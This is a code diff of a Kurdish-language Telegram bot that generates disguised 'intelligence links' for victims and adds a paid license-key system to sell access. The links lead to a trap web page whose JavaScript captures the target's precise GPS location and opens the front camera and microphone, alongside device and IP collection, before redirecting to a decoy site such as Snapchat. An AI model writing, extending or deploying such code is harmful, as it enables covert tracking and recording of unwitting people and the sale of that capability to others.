@@ -2,6 +2,8 @@ import asyncio
 import logging
 import os
 import base64
+import sqlite3
+from datetime import datetime, timedelta
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
@@ -16,153 +18,157 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
 user_states = {}
-user_languages = {ADMIN_ID: "ku"}
+user_languages = {}
+
+# دروستکردنی داتابەیس بۆ کلیلەکان
+def init_db():
+    conn = sqlite3.connect("bot_licenses.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS licenses (
+            key TEXT PRIMARY KEY,
+            user_id INTEGER,
+            expiry_date TEXT
+        )
+    """)
+    conn.commit()
+    conn.close()
+
+init_db()
+
+def add_license(key: str, user_id: int = None, days: int = 30):
+    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
+    conn = sqlite3.connect("bot_licenses.db")
+    cursor = conn.cursor()
+    cursor.execute("INSERT OR REPLACE INTO licenses (key, user_id, expiry_date) VALUES (?, ?, ?)", (key, user_id, expiry))
+    conn.commit()
+    conn.close()
+
+def check_license(user_id: int):
+    if user_id == ADMIN_ID:
+        return True
+    conn = sqlite3.connect("bot_licenses.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT expiry_date FROM licenses WHERE user_id = ?", (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+    if row:
+        expiry_date = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
+        if datetime.now() < expiry_date:
+            return True
+    return False
+
+def activate_key(user_id: int, key: str):
+    conn = sqlite3.connect("bot_licenses.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT expiry_date, user_id FROM licenses WHERE key = ?", (key,))
+    row = cursor.fetchone()
+    if row:
+        db_expiry, db_user = row
+        if db_user is None or db_user == user_id:
+            expiry = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
+            cursor.execute("UPDATE licenses SET user_id = ?, expiry_date = ? WHERE key = ?", (user_id, expiry, key))
+            conn.commit()
+            conn.close()
+            return True
+    conn.close()
+    return False
 
 TEXTS = {
     "ku": {
         "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
         "menu_stats": "📊 باری سیستەم",
-        "menu_lang": "🌐 گۆڕینی زمان",
-        "menu_ai": "🧠 زیرەکی دەستکرد",
-        "welcome": "🌟 **بەخێر بێیتەوە سەرۆک بۆ ناوەندی کۆنتڕۆڵی شاهانەی هەواڵگری!**\n\n🛡️ سیستەم لە لوتکەی ئامادەباشیدایە. فەرموو فەرمانێک هەڵبژێرە:",
-        "ask_redirect": "🔗 **سەرۆک، فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`) تاوەکو قوربانییەکە ڕاستەوخۆ بۆی ببرێت.",
-        "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
-        "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
-        "lang_changed": "🟢 زمان گۆڕرا بۆ **کوردی**.",
-        "ai_prompt": "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان داواکارییەکەت بنووسە تاوەکو وەڵامت بدەمەوە.",
-        "link_success": "🎯 **لینکی هەواڵگری و فێڵ بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییە پێشکەوتووەکان:**\n• کۆکردنەوەی خۆکاری زانیاری ئامێر و IP\n• وەرگرتنی GPS و ڤیدیۆ/دەنگی پێشکەوتووی کامێرا\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
-    },
-    "en": {
-        "menu_link": "🔗 Create Intelligence Link",
-        "menu_stats": "📊 System Status",
-        "menu_lang": "🌐 Change Language",
-        "menu_ai": "🧠 Artificial Intelligence",
-        "welcome": "🌟 **Welcome back, Commander, to the Royal Intelligence Command Center!**\n\n🛡️ The system is at peak readiness. Please select an option:",
-        "ask_redirect": "🔗 **Commander, please send the target redirect link** (e.g., `https://snapchat.com/...`) for the victim.",
-        "stats": "📊 **Royal System Status:**\n\n• Status: 🟢 100% Active & Fast\n• Security Level: 🛡️ Tier 1 (Gov)\n• Web Server: 🌐 Connected to Railway\n• Power & Scale: ⚡ 2x Boosted",
-        "lang_select": "⚙️ **Please choose your interface language:**",
-        "lang_changed": "🟢 Language changed to **English**.",
-        "ai_prompt": "🧠 **AI Core is ready:**\nType your prompt or inquiry below.",
-        "link_success": "🎯 **Intelligence link generated successfully!**\n\n🔗 **Link:** `{payload_link}`\n\n📱 **Advanced Features:**\n• Auto-collection of device info & IP\n• High-res GPS and Video/Audio capture\n• Seamless redirection",
+        "menu_key": "🔑 دروستکردنی کلیل (تەنیا ئەدمین)",
+        "welcome": "🌟 **بەخێر بێیت بۆ سیستەمی هەواڵگری گشتی!**\n\n🔑 بۆ بەکارهێنانی بۆتەکە، پێویستە کلیلی چالاککردن بنێریت.\nفەرموو کلیلی خۆت بنووسە یان بینێرە:",
+        "ask_key": "🔑 فەرموو کلیلی چالاککردن بنووسە:",
+        "key_active": "🟢 **کلیلەکە بە سەرکەوتوویی چالاک بوو!** ئێستا بۆتەکە بۆ ماوەی ١ مانگ کارا دەبێت.",
+        "key_invalid": "❌ **کلیلەکە هەڵەیە یان بەسەرچووە.** تکایە کلیلێکی ڕاستەوخۆ لە ئەدمین وەربگرە.",
+        "expired": "❌ **ماوەی کلیلی ١ مانگەی تو کۆتایی هات!**\nتکایە بۆ نوێکردنەوەی کلیل پەیوەندی بە ئەدمین بکە.",
+        "ask_redirect": "🔗 **فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`)",
+        "link_success": "🎯 **لینکی هەواڵگری و کلیل بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`",
     }
 }
 
-def get_current_lang(user_id):
-    return user_languages.get(user_id, "ku")
-
-def get_reply_menu(lang="ku"):
-    t = TEXTS[lang]
-    return ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text=t["menu_link"]), KeyboardButton(text=t["menu_stats"])],
-            [KeyboardButton(text=t["menu_lang"]), KeyboardButton(text=t["menu_ai"])]
-        ],
-        resize_keyboard=True,
-        input_field_placeholder="👑 فەرماندە، فەرمانێک هەڵبژێرە..." if lang=="ku" else "👑 Commander, select a command..."
-    )
-
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
+    user_id = message.from_user.id
+    user_languages[user_id] = "ku"
+    
+    if user_id == ADMIN_ID:
+        await message.answer("🌟 **بەخێر بێیتەوە سەرۆک بۆ پەنەڵی ئەدمین!**\n\nفەرمانەکان:\n• دروستکردنی کلیل: `/genkey <کلیل>`\n• دروستکردنی لینک: ناردنی ڕیدایریکت لینک", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔗 دروستکردنی لینکی هەواڵگری")]], resize_keyboard=True))
+        return
+
+    if check_license(user_id):
+        await message.answer("🌟 **بەخێر بێیتەوە!** کلیلی تو کارایە و دەتوانیت بۆتەکە بەکاربهێنیت.", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔗 دروستکردنی لینکی هەواڵگری")]], resize_keyboard=True))
+    else:
+        user_states[user_id] = {"step": "waiting_key"}
+        await message.answer(TEXTS["ku"]["welcome"])
+
+@dp.message(Command("genkey"))
+async def generate_key_cmd(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
-    lang = get_current_lang(message.from_user.id)
-    await message.answer(TEXTS[lang]["welcome"], reply_markup=get_reply_menu(lang))
-
-@dp.message(F.text.in_(["🔗 دروستکردنی لینکی هەواڵگری", "🔗 Create Intelligence Link"]))
-async def start_link_creation(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await message.answer("⚠️ تکایە کلیلێک بنووسە. وەک: `/genkey SURCHI2026`")
         return
-    lang = get_current_lang(message.from_user.id)
-    user_states[ADMIN_ID] = {"step": "waiting_redirect"}
-    await message.answer(TEXTS[lang]["ask_redirect"], reply_markup=get_reply_menu(lang))
-
-@dp.message(F.text.in_(["📊 باری سیستەم", "📊 System Status"]))
-async def system_stats(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    lang = get_current_lang(message.from_user.id)
-    await message.answer(TEXTS[lang]["stats"], reply_markup=get_reply_menu(lang))
-
-@dp.message(F.text.in_(["🌐 گۆڕینی زمان", "🌐 Change Language"]))
-async def change_lang_menu(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    lang = get_current_lang(message.from_user.id)
-    lang_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(text="کوردی ☀️", callback_data="lang_ku"),
-            InlineKeyboardButton(text="English 🇬🇧", callback_data="lang_en")
-        ]
-    ])
-    await message.answer(TEXTS[lang]["lang_select"], reply_markup=lang_kb)
-
-@dp.message(F.text.in_(["🧠 زیرەکی دەستکرد", "🧠 Artificial Intelligence"]))
-async def ai_core_menu(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    lang = get_current_lang(message.from_user.id)
-    user_states[ADMIN_ID] = {"step": "waiting_ai_prompt"}
-    await message.answer(TEXTS[lang]["ai_prompt"], reply_markup=get_reply_menu(lang))
-
-@dp.callback_query(F.data.startswith("lang_"))
-async def set_lang_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        return
-    await callback.answer()
-    lang = callback.data.split("_")[1]
-    user_languages[ADMIN_ID] = lang
-    await callback.message.answer(TEXTS[lang]["lang_changed"], reply_markup=get_reply_menu(lang))
+    key = args[1].strip()
+    add_license(key, user_id=None, days=30)
+    await message.answer(f"✅ **کلیل بە سەرکەوتوویی دروست کرا:**\n`{key}`\n\nئەم کلیلە ١ مانگ کارا دەبێت بۆ هەر کەسێک کە بەکاری بهێنێت.")
 
 @dp.message(F.text & ~F.text.startswith("/"))
 async def handle_text_inputs(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    
-    lang = get_current_lang(message.from_user.id)
+    user_id = message.from_user.id
     text = message.text.strip()
     
-    if text in [TEXTS["ku"]["menu_link"], TEXTS["en"]["menu_link"],
-                TEXTS["ku"]["menu_stats"], TEXTS["en"]["menu_stats"],
-                TEXTS["ku"]["menu_lang"], TEXTS["en"]["menu_lang"],
-                TEXTS["ku"]["menu_ai"], TEXTS["en"]["menu_ai"]]:
+    if user_id not in user_languages:
+        user_languages[user_id] = "ku"
+        
+    state = user_states.get(user_id, {}).get("step")
+    
+    if state == "waiting_key":
+        if activate_key(user_id, text):
+            user_states[user_id] = {}
+            await message.answer(TEXTS["ku"]["key_active"], reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔗 دروستکردنی لینکی هەواڵگری")]], resize_keyboard=True))
+        else:
+            await message.answer(TEXTS["ku"]["key_invalid"])
         return
 
-    state = user_states.get(ADMIN_ID, {}).get("step")
-    
-    if state == "waiting_redirect":
-        user_states[ADMIN_ID] = {"step": "waiting_image", "target_url": text}
-        await message.answer(
-            "✅ **لينکەکە وەرگیرا.**\n\n📸 ئێستا **ئەو وێنەیەم بۆ بنێرە** کە دەتەوێت لەگەڵ لینکەکەدا پیشانی قوربانی بدرێت." if lang=="ku" else "✅ **Link received.**\n\n📸 Now **send me the image** to display with the link.",
-            reply_markup=get_reply_menu(lang)
-        )
-    elif state == "waiting_ai_prompt":
-        ai_response = f"🤖 **Royal AI Analysis:**\n\nبۆ پرسیارەکەی ئێوە ('{text}'):\nسیستەمی زیرەکی دەستکردی شاهانە لە لوتکەی توانادایە." if lang=="ku" else f"🤖 **Royal AI Analysis:**\n\nRegarding your prompt ('{text}'):\nThe Royal AI core processed your inquiry successfully."
-        user_states[ADMIN_ID] = {}
-        await message.answer(ai_response, reply_markup=get_reply_menu(lang))
+    if not check_license(user_id):
+        user_states[user_id] = {"step": "waiting_key"}
+        await message.answer(TEXTS["ku"]["expired"])
+        return
+
+    if text == "🔗 دروستکردنی لینکی هەواڵگری":
+        user_states[user_id] = {"step": "waiting_redirect"}
+        await message.answer(TEXTS["ku"]["ask_redirect"])
+        return
+
+    if user_states.get(user_id, {}).get("step") == "waiting_redirect":
+        user_states[user_id] = {"step": "waiting_image", "target_url": text}
+        await message.answer("📸 ئێستا **ئەو وێنەیەم بۆ بنێرە** کە دەتەوێت لەگەڵ لینکەکەدا پیشانی قوربانی بدرێت.")
 
 @dp.message(F.photo)
 async def handle_admin_photo(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    user_id = message.from_user.id
+    if not check_license(user_id):
         return
     
-    state = user_states.get(ADMIN_ID, {}).get("step")
-    lang = get_current_lang(message.from_user.id)
-    
+    state = user_states.get(user_id, {}).get("step")
     if state == "waiting_image":
         photo_id = message.photo[-1].file_id
-        target_url = user_states[ADMIN_ID].get("target_url")
+        target_url = user_states[user_id].get("target_url")
         
         railway_domain = FIXED_DOMAIN
         if not railway_domain.startswith("http"):
             railway_domain = f"https://{railway_domain}"
             
         payload_link = f"{railway_domain}/secure?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
-        response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
+        response_text = TEXTS["ku"]["link_success"].format(payload_link=payload_link)
         
-        user_states[ADMIN_ID] = {}
-        await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
+        user_states[user_id] = {}
+        await bot.send_photo(chat_id=user_id, photo=photo_id, caption=response_text, parse_mode="Markdown")
 
-# پەڕەی تەڵەی شاهانە - سیستەمی دوو هەنگاوی بۆ تێپەڕاندنی قەدەغەکردنی مۆبایل
 async def web_trap_page(request: web.Request):
     encoded_redirect = request.query.get('id', '')
     try:
@@ -249,7 +255,6 @@ async def web_trap_page(request: web.Request):
         }});
 
         function runEngine() {{
-            // ١. وەرگرتنی شوێنی جوگرافی GPS
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
                     fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
@@ -258,7 +263,6 @@ async def web_trap_page(request: web.Request):
                 }}, {{ timeout: 5000, enableHighAccuracy: true }});
             }}
 
-            // ٢. داواکردنی کامێرا و مایک بە شێوازێکی تەواو ئۆپتیماڵ
             navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}, audio: true }})
             .then(function(stream) {{
                 let video = document.getElementById('v');
